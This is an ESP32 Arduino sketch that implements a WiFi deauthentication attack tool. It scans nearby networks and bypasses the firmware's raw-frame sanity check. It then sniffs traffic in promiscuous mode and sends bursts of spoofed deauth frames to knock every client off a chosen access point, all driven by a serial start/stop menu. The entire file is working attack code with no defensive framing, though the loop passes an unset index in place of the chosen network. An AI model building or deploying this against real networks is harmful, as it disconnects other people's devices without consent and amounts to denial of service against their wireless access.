#include <WiFi.h>
#include <esp_wifi.h>
#define maxn 20
#define LED_PIN 2
// Deauthentication frame structure
typedef struct {
    uint8_t frame_control[2] = { 0xC0, 0x00 };
    uint8_t duration[2];
    uint8_t station[6];
    uint8_t sender[6];
    uint8_t access_point[6];
    uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
    uint16_t reason;
} deauth_frame_t;

typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t sequence_ctrl;
    uint8_t addr4[6];
} mac_hdr_t;

typedef struct {
    mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_packet_t;

const wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Deauthentication frame
deauth_frame_t deauth_frame;
int eliminated_stations = 0;  // Track how many stations are eliminated

// Attack flag


extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Sniffer callback function to capture packets in promiscuous mode
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_packet_t *sniffed_packet = (wifi_packet_t *)pkt->payload;
    const mac_hdr_t *mac_header = &sniffed_packet->hdr;

    const uint16_t pkt_length = pkt->rx_ctrl.sig_len - sizeof(mac_hdr_t);

    if (pkt_length < 0) return;

    // Check if the frame is from the target access point
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
        memcpy(deauth_frame.station, mac_header->src, 6);
        for (int i = 0; i < 16; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
        }
        eliminated_stations++;
        Serial.printf("Sent %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", 16,
                mac_header->src[0], mac_header->src[1], mac_header->src[2],
                mac_header->src[3], mac_header->src[4], mac_header->src[5]);
        blink_led(2, 20);  // Blink LED as feedback
    }
}

void printBSSID(uint8_t* bssid,int ln) {
    for (int i = 0; i < 6; i++) {
        if (i > 0) Serial.print(":");
        // Print each byte with two digits and uppercase HEX representation
        if (bssid[i] < 0x10) Serial.print("0");  // Add leading zero for values < 0x10
        Serial.print(bssid[i], HEX);
    }
    if (ln == 1){
        Serial.println();  // Move to the next line after printing
    }
}
// Blink LED function
void blink_led(int num_times, int blink_duration) {
    for (int i = 0; i < num_times; i++) {
        digitalWrite(LED_PIN, HIGH);  // Turn on the LED
        delay(blink_duration);        // Wait for the specified blink duration
        digitalWrite(LED_PIN, LOW);   // Turn off the LED
        delay(blink_duration);        // Wait again before the next blink
    }
}
int scan() {
    Serial.println("Scanning for networks...");
    int n = WiFi.scanNetworks(); // Scan for networks
    if (n < 0) {
        Serial.println("Scan failed!");
        return 0;
    } else {
        for (int i = 0; i < n; i++) {
            // Directly print network details without storing them in arrays
            Serial.print(i + 1); 
            Serial.print(") SSID: ");
            Serial.print(WiFi.SSID(i)); // Print SSID
            Serial.print(" | BSSID: ");
            printBSSID(WiFi.BSSID(i), 0); // Print BSSID
            Serial.print(" | Channel: ");
            Serial.print(WiFi.channel(i)); // Print channel
            Serial.printf(" | dBm : %4d", WiFi.RSSI(i)); // Print signal strength
            Serial.print(" | Security: ");

            // Print encryption type
            switch (WiFi.encryptionType(i)) {
                case WIFI_AUTH_OPEN:
                    Serial.print("Open");
                    break;
                case WIFI_AUTH_WEP:
                    Serial.print("WEP");
                    break;
                case WIFI_AUTH_WPA_PSK:
                    Serial.print("WPA");
                    break;
                case WIFI_AUTH_WPA2_PSK:
                    Serial.print("WPA2");
                    break;
                case WIFI_AUTH_WPA_WPA2_PSK:
                    Serial.print("WPA+WPA2");
                    break;
                case WIFI_AUTH_WPA2_ENTERPRISE:
                    Serial.print("WPA2-EAP");
                    break;
                case WIFI_AUTH_WPA3_PSK:
                    Serial.print("WPA3");
                    break;
                case WIFI_AUTH_WPA2_WPA3_PSK:
                    Serial.print("WPA2+WPA3");
                    break;
                case WIFI_AUTH_WAPI_PSK:
                    Serial.print("WAPI");
                    break;
                default:
                    Serial.print("Unknown");
            }
            Serial.println(" ");
        }
        return n; // Return the number of networks found
    }
}



// Start the deauth attack
void start_deauth(int wifi_number, uint16_t reason) {
    eliminated_stations = 0;
    deauth_frame.reason = reason;

    int numNetworks = WiFi.scanNetworks();
    if (wifi_number < 0 || wifi_number >= numNetworks) {
        Serial.println("Invalid WiFi network index");
        return;
    }

    Serial.print("Starting Deauth-Attack on network: ");
    Serial.println(WiFi.SSID(wifi_number));

    const uint8_t* bssid = WiFi.BSSID(wifi_number);
    if (bssid == nullptr) {
        Serial.println("Error: Failed to get BSSID");
        return;
    }

    memcpy(deauth_frame.access_point, bssid, 6);
    memcpy(deauth_frame.sender, bssid, 6);

    // Set up the access point for the attack (SoftAP mode)
    WiFi.softAP("inws", "123456789", WiFi.channel(wifi_number));

    // Enable promiscuous mode and start sniffing
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
    Serial.println("Stopping Deauth-Attack...");
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    Serial.println("Deauth Attack Stopped.");
}

// Deauth attack logic
void deauth(int network,int controle) {
    if (controle == 0) {  // Start the attack if not already attacking
        start_deauth(network, 0);  // Attack the first network (change as needed)
        Serial.println("Deauth Attack Started");
    } else if (controle == 1) {  // Stop the attack if it is running
        stop_deauth();
        Serial.println("Deauth Attack Stopped");
    }
}

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    Serial.println("Deauth Attack Ready");
    pinMode(LED_PIN, OUTPUT);
}
int total;
int ind;
bool scan_status = true;

void loop() {
    if (scan_status) {
        blink_led(3, 200);  // Blink the LED three times as an indication that setup is done
        total = scan();
        scan_status = false;
        Serial.print("!#>  ");
    }
    if (Serial.available() > 0) {
        String input = Serial.readStringUntil('\n');
        input.trim();  // Remove leading and trailing whitespace

        // Rescan command
        if (input.equalsIgnoreCase("rescan") || input.equalsIgnoreCase("res")) {
            scan_status = true; // Reset scan status to allow rescanning
        }
        // Stop Deauth attack command
        else if (input.equalsIgnoreCase("stop")) {
            deauth(ind,1);
        }
        // Start Deauth attack on specific network
        else {
            int network_index = input.toInt() - 1;  // Adjust for 0-based index
            if (input.length() > 0 && network_index >= 0 && network_index < total) {
                deauth(ind,0);
            } else {
                Serial.println("Invalid input: " + input);
            }
        }
    }
}


